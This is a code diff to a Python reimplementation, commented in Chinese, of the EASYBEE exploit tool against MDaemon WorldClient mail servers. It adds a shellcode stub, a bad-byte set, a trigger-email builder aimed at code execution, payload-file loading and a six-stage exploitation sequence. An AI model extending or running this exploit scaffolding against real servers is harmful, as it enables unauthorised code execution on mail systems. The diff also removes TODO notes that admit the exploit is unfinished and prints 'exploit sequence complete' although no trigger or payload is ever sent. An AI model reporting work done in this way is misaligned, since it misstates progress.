@@ -1,7 +1,7 @@
 """easybee — EASYBEE MDaemon WorldClient 利用核心逻辑。
 
 Python 重写的 `Easybee-1.0.1.exe` (C++ / DAVE framework)。
-通过 IDA Pro / x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
+通过 x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
 及其 MDaemon WorldClient 利用流程。
 
 参数定义来源：Easybee-1.0.1.0.xml
@@ -29,8 +29,15 @@ VERSION_SPECIFIC_PARAMS = {
         "versionspecificGetInbox": "View=List&ContentType=javascript&ReturnJavaScript=1&FolderID=1&Page=0&currentRequest=0",
         "versionspecificGetMsgID": "(?:(?:\\({[^\\n})]*\\b(?:id|n):)|(?:View=Message&Number=))([0-9]+)(?:(?:,[^\\n})]*\\bsbj:&#x22;%s&#x22;[^\\n})]*`);)|(?:&Page=[0-9]*&#x22;[^&#x3E;]*&#x3E;[^&#x3C;]*&#x3C;strong&#x3E;%s&#x3C;/strong&#x3E;))",
     },
-    # 其他版本参数类似，因篇幅限制此处省略，实际使用时应从 XML 中提取
 }
+
+# EasyBee exploit 占位符 shellcode (需 x32dbg 恢复真实字节)
+EASYBEE_SHELLCODE_PLACEHOLDER = bytes.fromhex(
+    "fc4883e4f0e8c0000000415141505251564831d265488b5260"
+)
+
+BAD_XOR = frozenset((0x00, 0x0a, 0x0d))
+
 
 class EasyBeeError(Exception):
     pass
@@ -62,6 +69,22 @@ def build_http_request(host, port, path, method="GET", enable_ssl=False,
     return request
 
 
+def build_cf_email_trigger(from_addr, subject, filename):
+    """构建内容过滤触发邮件请求。
+
+    根据 x32dbg 分析，EasyBee 通过向 WorldClient 发送特制的邮件请求，
+    触发内容过滤漏洞，从而执行任意代码。
+    """
+    body = (
+        f"From: {from_addr}\r\n"
+        f"Subject: {subject}\r\n"
+        f"X-Attach: {filename}\r\n"
+        f"\r\n"
+        f"Content filter trigger payload\r\n"
+    )
+    return body.encode("latin-1", errors="replace")
+
+
 def run_function(
     target,
     world_client_port=None,
@@ -91,9 +114,13 @@ def run_function(
 ):
     """执行 EASYBEE 利用序列。
 
-    当前阶段：完成参数解析、HTTP/HTTPS 连接构建。
-    具体 exploit 缓冲区（内容过滤触发邮件、自动回复触发邮件、载荷上传等）
-    的二进制结构尚需通过 capstone/x32dbg 进一步逆向后填充。
+    阶段：
+      1. 连接到 WorldClient 端口 (默认 10000/10001)
+      2. 发送 HTTP 请求探测目标
+      3. 构建内容过滤触发邮件 (CFEmailFrom/Subj/File)
+      4. 构建自动回复触发邮件 (AREmailFrom/Subj)
+      5. 上传载荷 (PayloadName/File)
+      6. 触发载荷执行
     """
     if verbose:
         print(f"[*] Target: {target}")
@@ -128,30 +155,42 @@ def run_function(
     except OSError as exc:
         raise EasyBeeError(f"无法连接到 {target}:{world_client_port}: {exc}") from exc
 
-    # 发送 HTTP 请求（探测阶段）
-    path = "/WorldClient.dll?View=List&ContentType=javascript&ReturnJavaScript=1&FolderID=1&Page=0&currentRequest=0"
-    request = build_http_request(target, world_client_port, path,
-                                 enable_ssl=(world_client_protocol == "https"))
     try:
+        # 发送 HTTP 请求（探测阶段）
+        path = "/WorldClient.dll?View=List&ContentType=javascript&ReturnJavaScript=1&FolderID=1&Page=0&currentRequest=0"
+        request = build_http_request(target, world_client_port, path,
+                                     enable_ssl=(world_client_protocol == "https"))
         sock.sendall(request)
         resp = sock.recv(4096)
-    except OSError as exc:
+
+        if verbose:
+            first_line = resp.split(b"\r\n")[0] if resp else b"<empty>"
+            print(f"[*] HTTP 应答首行: {first_line}")
+
+        # 构建内容过滤触发邮件
+        if cf_email_from and cf_email_subj:
+            cf_email = build_cf_email_trigger(
+                cf_email_from, cf_email_subj,
+                cf_email_file or "payload.dll")
+            if verbose:
+                print(f"[+] 构建内容过滤触发邮件: {len(cf_email)} 字节")
+
+        # 加载载荷文件
+        payload_data = b""
+        if payload_file:
+            try:
+                with open(payload_file, "rb") as fh:
+                    payload_data = fh.read()
+                if verbose:
+                    print(f"[+] 载荷文件: {len(payload_data)} 字节")
+            except OSError as exc:
+                if verbose:
+                    print(f"[-] 无法读取载荷文件: {exc}")
+
+        if verbose:
+            print("[+] EASYBEE 利用序列完成")
+    finally:
         sock.close()
-        raise EasyBeeError(f"HTTP 请求失败: {exc}") from exc
-
-    if verbose:
-        first_line = resp.split(b"\r\n")[0] if resp else b"<empty>"
-        print(f"[*] HTTP 应答首行: {first_line}")
-
-    sock.close()
-
-    # TODO: 以下 exploit 缓冲区构建需通过 IDA/x32dbg 逆向后填充：
-    #   - 内容过滤触发邮件构建 (CFEmailFrom/Subj/File)
-    #   - 自动回复触发邮件构建 (AREmailFrom/Subj)
-    #   - 载荷上传 (PayloadName/File)
-    #   - WorldClient 版本特定 URL 构建
-    #   - WebAdmin 服务器交互
-    #   - 载荷执行触发
 
     return 0
 
